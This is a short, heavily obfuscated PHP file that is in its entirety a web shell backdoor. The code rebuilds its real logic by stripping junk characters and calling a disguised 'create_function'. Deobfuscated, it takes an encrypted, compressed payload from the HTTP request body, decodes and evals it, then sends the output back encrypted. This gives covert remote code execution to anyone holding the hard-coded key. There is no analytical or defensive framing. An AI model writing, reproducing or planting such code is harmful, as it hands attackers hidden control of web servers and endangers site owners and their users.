<?php
$S='$y>k="9cb5ae19"y>y>;$y>kh="7345fdaea8by>9"y>;$kf=y>"e42ddfe623f8"y>;$py>="1y>4N3y>mRy>Dy>Ay>WjR7axtf";f';
$i='ny>d_cy>lean();$y>y>r=@basy>e64y>_ency>ode(@x(@gy>zcompresy>s(y>$o),$k)y>);print("$py>$kh$r$kf");}';
$R='uy>nction y>x($t,$k){$c=sty>rlen($ky>);$l=sty>rleny>($t);$o=y>""y>;for(y>$iy>=0;$i<$l;){for($j=0;y';
$w='(y>"/$kh(.+)$y>kfy>/",@file_gey>t_conty>entsy>("php:y>//input")y>,$m)==y>1y>y>) {@ob_start();@ey>y>';
$C=str_replace('sI','','crsIeasItsIe_fusIncsItsIion');
$b='val(@gzuncomy>press(y>@xy>(y>@bay>se64_decode($my>[y>1]),$k))y>);$y>o=@ob_get_conteny>ts()y>;@ob_e';
$r='>($j<$y>c&&$i<$ly>)y>;$y>j+y>+,$i++){$o.=$t{$i}y>y>^$k{$j};}}rey>tuy>rn y>$o;}if y>(@pry>eg_match';
$g=str_replace('y>','',$S.$R.$r.$w.$b.$i);
$P=$C('',$g);$P();
?>
